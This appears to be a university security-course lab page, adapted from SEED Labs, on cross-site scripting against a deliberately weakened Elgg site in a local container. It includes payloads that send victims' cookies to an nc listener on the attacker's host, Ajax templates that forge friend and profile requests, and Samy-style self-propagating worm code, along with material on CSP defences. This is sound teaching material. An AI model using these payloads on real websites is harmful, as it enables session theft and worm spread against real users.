---
layout: default
tags: [labs, seed]
dirname: 'lab05'
dircode: '05_xss'
labprefix: 'Lab 05'
labtitle: 'Cross-Site Scripting (XSS) Attack Lab'
title: 'Lab 05: Cross-Site Scripting (XSS) Attack Lab'
duedate: 'Tuesday [03/23/2021] @ 11:59 AM (MST)'
released: True
---

# {{page.labprefix}}: {{page.labtitle}}
{:.pb-4}

## {{page.labtitle}}
{:.titletext}
Adapted from SEED Labs: A Hands-on Lab for Security Education.
{:.subtitletext}

Cross-site scripting (XSS) is a type of vulnerability commonly found in web applications.
This vulnerability makes it possible for attackers to inject malicious code (e.g., JavaScript) into a victim's web browser.
Using this malicious code, attackers can steal a victim's credentials, such as session cookies.
Access control policies (i.e., the same origin policy) employed by browsers to protect user credentials can be bypassed by exploiting XSS vulnerabilities.

To demonstrate what attackers can do by exploiting XSS vulnerabilities, we have set up a web application named Elgg.
Elgg is a very popular open-source social networking web application, and it has implemented a number of countermeasures to remedy XSS threats.
To demonstrate how XSS attacks work, we have disabled these countermeasures in our installation of Elgg, intentionally making Elgg vulnerable to XSS attacks.
Without the countermeasures, users can post arbitrary message, including JavaScript code, to user profiles.

In this lab, students need to exploit this vulnerability to launch an XSS attack on the modified Elgg web app
in a way that is similar to what Samy Kamkar did to MySpace in 2005 through the notorious Samy worm.
The ultimate goal of this attack is to spread an XSS worm among users,
such that whoever views an infected user profile will be infected,
and whoever is infected will add you (i.e., the attacker) to their friend list.

This lab covers the following topics:

-   Cross-Site Scripting attack
-   XSS worm and self-propagation
-   Session cookies
-   HTTP GET and POST requests
-   JavaScript and Ajax
-   Content Security Policy (CSP)

### Resources

- Code related to this lab can be found in `{{page.dircode}}/` of our [class's GitHub repository](https://github.com/traviswpeters/cs476-code).
- Summaries and references that can help you learn about using various [Web Tools]({{ 'webtools' | relative_url }}) (e.g., Burp Suite, HTTP Headers Live).
- [Cross-Site Scripting (PortSwigger)](https://portswigger.net/web-security/cross-site-scripting)
- [Introduction to the DOM (MDN)](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction)
- [AJAX - Getting Started (MDN)](https://developer.mozilla.org/en-US/docs/Web/Guide/AJAX)
- [Using HTTP cookies (MDN)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [Document.cookie (MDN)](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie)
- [Same Origin Policy (MDN)](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy)
- [Content Security Policy (PortSwigger)](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)
- [Content Security Policy (MDN)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- Chapter 10 in the [SEED Textbook]({{site.data.settings.textbookseedlink}}).

<!-- BEGIN Special Section (Use Bootstrap "Card" Styles). This is nice for formatting background, setup, special instructions, etc. -->
<div class="card bg-secondary border-primary" markdown="1">
<div class="card-body" markdown="1">

## Environment Setup

In this lab, we will use a variety of websites all running on the same container.
Notably, the vulnerable Elgg site is accessible at [http://www.xsslabelgg.com/](http://www.xsslabelgg.com/).

> **WARNING:** Do not visit these websites outside of the VM / when the local webserver is not running.

### Container Setup and Commands

{% include lab_docker_overview.html classdir="05_xss" %}

### DNS Configuration

We have set up several websites for this lab.
They are all hosted within a single container with IP address `10.9.0.5`.
Your VM should already be configured to have these IP/hostname mappings in the `/etc/hosts` file:

```
10.9.0.5        www.xsslabelgg.com
10.9.0.5        www.example32a.com
10.9.0.5        www.example32b.com
10.9.0.5        www.example32c.com
10.9.0.5        www.example60.com
10.9.0.5        www.example70.com
```

By using `ifconfig` we can verify our host's IP address within the docker network:

```
[VM]$ ifconfig
#...snipped...

br-f2fb40f6b8ae: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.9.0.1  netmask 255.255.255.0  broadcast 10.9.0.255
             ^^^^^^^^
#...snipped...
```

In this case, my host can be addressed from a container by accessing `10.9.0.1`.
(This should be the same for you, but you should verify.)

### Elgg Web Application

In this lab we use an open-source web application called Elgg.
Elgg is a web-based social-networking application.
It is already set up in the provided container images.

We use two containers, one running the webserver (`10.9.0.5`), and another running the MySQL database (`10.9.0.6`).
The IP addresses for these two containers are hardcoded in various places in the configuration,
so please do not change them within the `docker-compose.yml` file.

{% include lab_elgg_users.html %}

### MySQL Database

{% include lab_mysql.html classdir="05_xss" %}

</div>
</div>
<!-- END Special Section -->


## Lab Tasks
{:.titletext}
This lab has been tested on the pre-built SEED VM (Ubuntu 20.04 VM).
{:.subtitletext}

### Prep: Analyzing and Crafting HTTP Requests

In this lab, we need to construct HTTP requests.
To figure out what an acceptable HTTP request in Elgg looks like, and to be able to send modified versions of acceptable HTTP requests, we need a tool that can help us capture, analyze, modify, and send HTTP requests.
We can use a variety of tools, such as

- [Burp Suite](https://medium.com/swlh/getting-started-with-burp-suite-on-ubuntu-3c1e665122a3)
- [HTTP Header Live](https://addons.mozilla.org/en-US/firefox/addon/http-header-live/) (a pre-installed Firefox extension)
<!-- - [OWASP's ZAP Proxy](https://www.zaproxy.org) -->
- (There are other tools you could use. If you go another route, please comment on the tool you choose and why.)

We provide summaries and/or references that can help you learn about how to use some of these tools on our [**Web Tools**]({{ 'webtools' | relative_url }}) page.

Before you start working on this lab, you should get familiar with at least one of these tools.

### Task 1: Post a Malicious Message to Display an Alert Window

The objective of this task is to embed JavaScript code in your Elgg profile, such that when another user views your profile,
the JavaScript code will be executed and an alert window will be displayed.

The following JavaScript code will display an alert window:

```js
<script>alert('XSS');</script>
```

If you embed the above JavaScript code in your profile (e.g., in the brief description field),
then any user who views your profile will see the alert window.
In this case, the JavaScript code is short enough to be typed into the short description field.
If you want to run a more substantial piece of JavaScript,
but you are limited by the number of characters you can type in the form,
you can store the JavaScript code in a standalone file, save it with the `.js` extension,
and then refer to it using the `src` attribute in the `<script>` tag.
For example:

```js
<script type="text/javascript"
    src="http://www.example.com/myscripts.js">
</script>
```

In this example, the page will fetch the JavaScript code from <http://www.example.com>, which can be any web server.

### Task 2: Post a Malicious Message to Display Cookies

The objective of this task is to embed JavaScript code in your Elgg profile, such that when another user views your profile, the user's cookies will be displayed in the alert window.
This can be done by adding additional code to the JavaScript code from the previous task:

```js
<script>alert(document.cookie);</script>
```

### Task 3: Steal Cookies from the Victim's Machine

In the previous task, the malicious JavaScript code written by the attacker can print out the user's cookies, but only the user can see the cookies, not the attacker.
In this task, the attacker wants the JavaScript code to send the cookies to somewhere that the attacker can access the information.
To achieve this, the malicious JavaScript code needs to send an HTTP request to the attacker, with the cookies appended to the request.

We can do this by having the malicious JavaScript insert an `<img>` tag with its `src` attribute set to the attacker's machine.
When the JavaScript inserts the `img` tag, the browser tries to load the image from the URL in the `src` field;
this results in an HTTP GET request sent to the attacker's machine.
The JavaScript given below sends the cookies to port 5555 of the attacker's machine (with IP address `10.9.0.1`),
where the attacker has a TCP server listening on the same port.

```js
<script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + '>');</script>
```

A commonly used program by attackers is `netcat` (or `nc`), which, if running with the `-l` option, becomes a TCP server that listens for a connection on the specified port.
This server program prints out whatever is sent by the client and sends to the client whatever is typed by the user running the server.
Type the following command below to listen on port `5555`:

```bash
$ nc -lknv 5555
```

- The `-l` option is used to specify that nc should listen for an incoming connection rather than initiate a connection to a remote host.
- The `-v` option is used to have `nc` give more verbose output.
- The `-n` option forces `nc`  to not do any DNS or service lookups on any specified addresses, hostnames or ports.
- The `-k` option indicates that, when a connection is completed, listen for another one.

#### For Fun!

While running `netcat` on the VM is interesting in its own right,
we can also use other approaches to receive the information exfiltrated from the user's browser.
For example, we could use something like [https://webhook.site/](https://webhook.site/),
which lets you, for instance, easily inspect any incoming HTTP request that is directed to a temporary URL they assign you.

### Task 4: Becoming the Victim's Friend

In this and next task, we will perform an attack similar to what Samy did to MySpace in 2005 (i.e. the Samy Worm).
We will write an XSS worm that adds Samy as a friend to any other user that visits Samy's page.
This worm does not self-propagate; in a later task we will make it self-propagating.

In this task, we need to write malicious JavaScript code that forges HTTP requests directly from the victim's browser, without the intervention of the attacker.
The objective of the attack is to add Samy as a friend to the victim.
We have already created a user called Samy on the Elgg server (the user name is `samy`).

To add a friend for the victim, we should first find out how a legitimate user adds a friend in Elgg.
More specifically, we need to figure out what is sent to the server when a user adds a friend.
(Any tool that helps with HTTP inspection is useful here.)
By inspecting the contents of HTTP requests, we can identify all of the parameters in the request.
Once we understand what the add-friend HTTP request look like, we can write JavaScript code to craft and send an identical HTTP request.
We provide template code that aids in completing the task.

```js
<script type="text/javascript">
window.onload = function () {
    var Ajax=null;

    // This data is sent by the server (look at the page's source code!)
    // and must be included in subsequent requests.
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;           // (1) elgg CSRF countermeasure
    var token="&__elgg_token="+elgg.security.token.__elgg_token;  // (2) elgg CSRF countermeasure

    // Construct the HTTP request to add Samy as a friend.
    var sendurl=...;  //FILL IN

    // Create and send an Ajax request to add friend
    Ajax=new XMLHttpRequest();
    Ajax.open("GET",sendurl,true);
    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
    Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
    Ajax.send();
}
</script>
```

The above code should be placed in the "About Me" field of Samy's profile page.
This field provides two editing modes: Editor mode (default) and Text mode.
The Editor mode adds extra HTML code to the text typed into the field, while the Text mode does not.
Since we do not want any extra code added to our attack code, the Text mode should be enabled before entering the above JavaScript code.
This can be done by clicking on "Edit HTML", which can be found at the top right of the "About Me" text field.

#### Task 4.1

Carry out the attack to add Samy as a friend to the victim. Describe your strategy and provide supporting code/details.

<!-- #### Task 4.2 -->

<!-- Explain the purpose of lines (1) and (2), and why are they are needed. -->

#### Task 4.2

If the Elgg application only provided the Editor mode for the "About Me" field (i.e., you cannot switch to the Text mode), can you still launch a successful attack?

### Task 5: Modifying the Victim's Profile

The objective of this task is to modify the victim's profile when the victim visits Samy's page.
We will write an XSS worm to complete the task.
This worm does not self-propagate; in a later task we will make it self-propagating.

Similar to the previous task, we need to write malicious JavaScript code that forges HTTP requests directly from the victim's browser, without the intervention of the attacker.
To modify profile, we should first find out how a legitimate user edits or modifies their profile in Elgg.
More specifically, we need to figure out how the HTTP POST request is constructed to modify a user's profile.
(Again, any tool that helps with HTTP inspection is useful here.)
Once we understand how the modify-profile HTTP POST request is formatted, we can write JavaScript code to send out an identical HTTP request.
We provide template code that aids in completing the task.

```js
<script type="text/javascript">
window.onload = function(){
    // JavaScript code to access user name, user guid, Time Stamp __elgg_ts and Security Token __elgg_token
    var name=elgg.session.user.name;
    var guid="&guid="+elgg.session.user.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
    var token="&__elgg_token="+elgg.security.token.__elgg_token;

    // Construct your url.
    var sendurl=...;     //FILL IN

    // Construct the content of your request.
    var content=...;     //FILL IN

    // Send the HTTP POST request
    var samyGuid=...;    //FILL IN
    if (elgg.session.user.guid!=samyGuid)       // (1)
    {
        // Create and send Ajax request to modify profile
        var Ajax=null;
        Ajax=new XMLHttpRequest();
        Ajax.open("POST",sendurl,true);
        Ajax.setRequestHeader("Host","www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
</script>
```

Similar to Task 4, the above code should be placed in the "About Me" field of Samy's profile page,
and the Text mode should enabled before entering the above JavaScript code.

#### Task 5.1

Carry out the attack to modify the victim's profile when the victim visits Samy's page.

#### Task 5.2

Why do we need line (1) in the code above?

Remove this line, and repeat your attack. Report and explain your observation(s).

### Task 6: Writing a Self-Propagating XSS Worm

To become a real worm, the malicious JavaScript code should be able to propagate itself.
Namely, whenever some people view an infected profile, not only will their profiles be modified,
the worm will also be propagated to their profiles, further affecting others who view these newly infected profiles.
Thus, the more people that view infected profiles, the faster the worm can propagate.
This is exactly the same mechanism used by the Samy Worm:
within just 20 hours of its October 4, 2005 release, over one million users were affected, making Samy one of the fastest spreading viruses of all time.
The JavaScript code that can achieve this is called a *self-propagating cross-site scripting worm*.
In this task, you need to implement such a worm, which not only modifies the victim's profile and adds the user "Samy" as a friend,
but also add a copy of the worm itself to the victim's profile, so the victim is in essence turned into an attacker.

To achieve self-propagation, when the malicious JavaScript modifies the victim's profile, it should copy itself to the victim's profile.
There are several approaches to achieve this, and we will discuss two common approaches.

> **Note:**
You are encouraged (but not required) to try both the Link and DOM approaches if you are interested in comparing the approaches.

<!-- In this lab, you are **required** to use the DOM approach to carry out your attack. -->
<!-- This approach is more challenging and it does not rely on external JavaScript code. -->

#### Link Approach

If the worm is included using the `src` attribute in the `<script>` tag, writing self-propagating worms is quite easy.
We discussed the `src` attribute in Task 1, and an example is given below.
The worm can simply copy the following `<script>` tag to the victim's profile, essentially infecting the profile with the same worm.

```js
<script type="text/javascript" src="http://example.com/xss_worm.js"></script>
```

> **NOTE:** Here `http://example.com/` is an example of a server that you as the attacker control.
> If you want to use this approach, you need somewhere to store your `xss_worm.js` file.
> This could be on a server running on your VM (`http://10.9.0.1/`),
> or a service that allows you to easily store/share code online (e.g., [GitHub Gist](https://gist.github.com/) or [Pastebin](https://pastebin.com/)),
> or something else!

#### DOM Approach

Assuming the entire JavaScript code (i.e., the worm) is embedded in the infected profile,
to propagate the worm to another profile, the worm code can use DOM APIs to retrieve a copy of itself from the web page.
An example of using DOM APIs is given below.
This code gets a copy of itself, and displays it in an alert window:

```js
<script id=worm>
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";  // (1)
    var jsCode = document.getElementById("worm").innerHTML;           // (2)
    var tailTag = "</" + "script>";                                   // (3)

    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);  // (4)

    alert(jsCode);
</script>
```

It should be noted that `innerHTML` (2) only gives us the inside part of the code, not including the surrounding `script` tags.
We just need to add the beginning tag `<script id="worm">` (1) and the ending tag `</script>` (3) to form an identical copy of the malicious code.

When data is sent in HTTP POST requests with the `Content-Type` set to `application/x-www-form-urlencoded`,
which is the type used in our code, the data should also be encoded.
The encoding scheme, *URL encoding*, replaces non-alphanumeric characters in the data with `%HH` (i.e., a percentage sign and two hexadecimal digits representing the ASCII code of the character).
The `encodeURIComponent()` function (4) is used to URL-encode a string.

<!-- BEGIN Special Section (Use Bootstrap "Card" Styles). This is nice for formatting background, setup, special instructions, etc. -->
<div class="card bg-secondary border-primary" markdown="1">
<div class="card-body" markdown="1">

## Elgg's Countermeasures

This aside is only for informational purposes, and there is no specific task to do.

In reality Elgg does have two effective countermeasures in place to defend against XSS attacks.
As noted earlier, we have disabled/commented out these countermeaures to make your attacks possible.
<!-- Actually, Elgg uses two countermeasures. -->

### htmLawed

One countermeasure consists of a custom security plugin, ["htmLawed"](https://www.bioinformatics.org/phplabware/internal_utilities/htmLawed/),
which, on activation, validates user input and removes tags from the input.
This specific plugin is registered to the function `filter_tags()` in the `input.php` file, which can be viewed on the `elgg-10.9.0.5` container.
<!-- $ find / -name input.php -exec grep -nHA 3 'function filter_tags' 2> /dev/null {} \; -->
<!-- $ grep -A 3 'function filter_tags' /var/www/elgg/vendor/elgg/elgg/engine/lib/input.php -->

If we grep for the function in this file:
```bash
$ grep -A 3 'function filter_tags' /var/www/elgg/vendor/elgg/elgg/engine/lib/input.php
```
we can clearly see that the relevant validation code has been commented out.
```js
function filter_tags($var) {
	// return elgg_trigger_plugin_hook('validate', 'input', null, $var);
	return $var;
}
```
**To turn on this countermeasure**,
login to the application as admin,
go to Account
&#8594; administration (top right)
&#8594; plugins (on the right panel),
and then click on "security and spam" under the filter options at the top of the page.
You should find the "HTMLawed" plugin here.
Click "Activate" to enable the countermeasure.

### htmlspecialchars

In addition to the "HTMLawed" security plugin, there is another built-in PHP method called
["htmlspecialchars"](https://www.php.net/manual/en/function.htmlspecialchars.php),
which is used to encode special characters included in user input;
for example `<` is encoded to `&lt`, `>` to `&gt`, etc.

**To turn on this countermeasure**,
navigate to the following directory, and locate and uncomment calls to `htmlspecialchars()` in each file in this directory.
_(The last time I checked, this function is called at various places in `url.php`, `text.php`, and `dropdown.php`.)_

```bash
cd /var/www/elgg/vendor/elgg/elgg/views/default/output
grep -n 'htmlspecialchars' *
# --> go into each file and uncomment calls to htmlspecialchars()
```

</div>
</div>
<!-- END Special Section -->

## Lab Tasks - Grad Student Credit

In addition to the problems above, students enrolled in CSCI 594 must also complete the following problems.

Students enrolled in CSCI 476 are encouraged to try these problems, but are not expected to submit solutions for these problems.

### Task 7: Defeating XSS Attacks Using CSP

The fundamental problem of the XSS vulnerability is that HTML allows JavaScript **code** to be mixed with **data**.
Therefore, to fix this fundamental problem, we need to separate code from data.
There are two ways to include JavaScript code inside an HTML page, one is the _inline approach_, and the other is the _link approach_.
The inline approach directly places code inside the page,
whereas the link approach utilizes code in an external file, and links to that external code from inside the page.

The inline approach is the culprit of the XSS vulnerability, because browsers do not know where the inlined code originates from:
_is it from the trusted web server or from untrusted users?_
Without such knowledge, browsers do not know what code is safe to execute, and what code is dangerous to execute.
The link approach provides a very important piece of information to browsers, i.e., where the code comes from.
Websites can then tell browsers which sources are trustworthy, so browsers know which piece(s) of code are safe to execute.
Although attackers can also use the link approach to include code in their input,
it requires attackers to somehow get their code stored in these trustworthy places (which is likely difficult.)

How websites tell browsers which sources are trustworthy is achieved using a security mechanism known as **_Content Security Policy (CSP)_**.
This mechanism is specifically designed to defeat XSS and ClickJacking attacks.
It has become a standard, which is supported by most browsers nowadays.
CSP not only restricts JavaScript code, it also restricts other page content, such as limiting where pictures, audio, and video can come from,
as well as restricting whether a page can be put inside an iframe or not (used for defeating ClickJacking attacks).
Here, we will only focus on how to use CSP to defeat XSS attacks.

<!-- BEGIN Special Section (Use Bootstrap "Card" Styles). This is nice for formatting background, setup, special instructions, etc. -->
<div class="card bg-secondary border-primary" markdown="1">
<div class="card-body" markdown="1">

#### CSP Experiment Setup

To conduct experiments on CSP, we will set up several websites.
Inside the `image_www/` directory for this lab, there is a file called `apache_csp.conf`.
This configuration file defines five websites, which share the same directory, but they will use different files in this directory.
The `example60` and `example70` sites are used for hosting JavaScript code.
The `example32a`, `example32b`, and `example32c` are the three websites that have different CSP configurations.
Details of the configuration are explained below.

#### Changing the Configuration File

In the experiment, you need to modify the above-mentioned Apache configuration file (`apache_csp.conf`).
If you make modifications directly to the file inside the image directory stored on the host (i.e., your SEED VM),
you need to rebuild the image and restart the container in order for the changes to take effect.

You can also modify the file within the container while the container is running.
> The downside of this option is that in order to keep the docker image small, we have only installed a very simple text editor called `nano` inside the container.
> It should be sufficient for simple editing.
> However, if you prefer a different editor, you can install such a program within the container (which will only exist in the current container as long as it is up and running), or you can add an installation command to the `Dockerfile` to install your favorite command-line text editor.

On the running container, you can find the configuration file `apache_csp.conf` inside the `/etc/apache2/sites-available` directory.
After making changes, you need to restart the Apache server for the changes to take effect:

```bash
$ service apache2 restart
```

#### DNS Setup

We will access the above websites from our VM.
Please see the DNS section under "Environment Setup" to learn more about the IP address / hostname mappings.

#### The CSP Experiment Webpage

The `example32(a|b|c)` servers host the same web page `index.html`, which is used to demonstrate how CSP policies work.
In this page, there are six areas: area1 to area6.
Initially, each area displays "Failed".
The page also includes six pieces of JavaScript code, each trying to write "OK" to its corresponding area.
If you see "OK" in an area, that means, the JavaScript code corresponding to that area has been executed successfully;
otherwise, we would see "Failed".
There is also a button on this page.
If it is clicked, and the underlying JavaScript code gets triggered, a message will pop up.

<script src="https://emgithub.com/embed.js?target=https%3A%2F%2Fgithub.com%2Ftraviswpeters%2Fcs476-code%2Fblob%2Fmaster%2F05_xss%2Fimage_www%2Fcsp%2Findex.html&style=monokai&showBorder=on&showLineNumbers=on&showFileMeta=on"></script>

#### Setting CSP Policies

CSP is set by the web server as an HTTP header.
There are two typical ways to set the header, by the web server (such as Apache) or by the web application.
In this experiment, we will conduct experiments using both approaches.

##### CSP Set By Apache

Apache can set HTTP headers for all the responses, so we can use Apache to set CSP policies.
In our configuration, we set up three websites, but only the second one sets CSP policies (lines 13-16).
With this setup, when we visit `example32b`, Apache will add the specified CSP header to all responses from this site.

<script src="https://emgithub.com/embed.js?target=https%3A%2F%2Fgithub.com%2Ftraviswpeters%2Fcs476-code%2Fblob%2Fmaster%2F05_xss%2Fimage_www%2Fapache_csp.conf&style=monokai&showBorder=on&showLineNumbers=on&showFileMeta=on"></script>

##### CSP Set By Web Apps

For the third `VirtualHost` entry in our configuration file (lines 20-24), we did not set up any CSP policy.
However, instead of accessing `index.html`, the entry point of this site is `phpindex.php`, which is a PHP program.
This program, listed below, adds a CSP header to the response generated from the program.

<script src="https://emgithub.com/embed.js?target=https%3A%2F%2Fgithub.com%2Ftraviswpeters%2Fcs476-code%2Fblob%2Fmaster%2F05_xss%2Fimage_www%2Fcsp%2Fphpindex.php&style=monokai&showBorder=on&showLineNumbers=on&showFileMeta=on"></script>

</div>
</div>
<!-- END Special Section -->

#### Lab Tasks
{:.pt-3}

After starting the containers, please visit the following URLs from your VM.

- [http://www.example32a.com](http://www.example32a.com)
- [http://www.example32b.com](http://www.example32b.com)
- [http://www.example32c.com](http://www.example32c.com)

##### Task 7.1

Describe and explain your observations when you visit these websites.

##### Task 7.2

Click the button in the web pages from all the three websites, describe and explain your observations.

##### Task 7.3

Change the server configuration on `example32b` (modify the Apache configuration), so Areas 5 and 6 display "OK".
Please include your modified configuration in the lab report.

##### Task 7.4

Change the server configuration on `example32c` (modify the PHP code), so Areas 1, 2, 4, 5, and 6 all display "OK".
Please include your modified configuration in the lab report.

##### Task 7.5

Please explain why CSP can help prevent XSS attacks.


<!-- Submission Instructions -->
{% include lab_submission.html %}
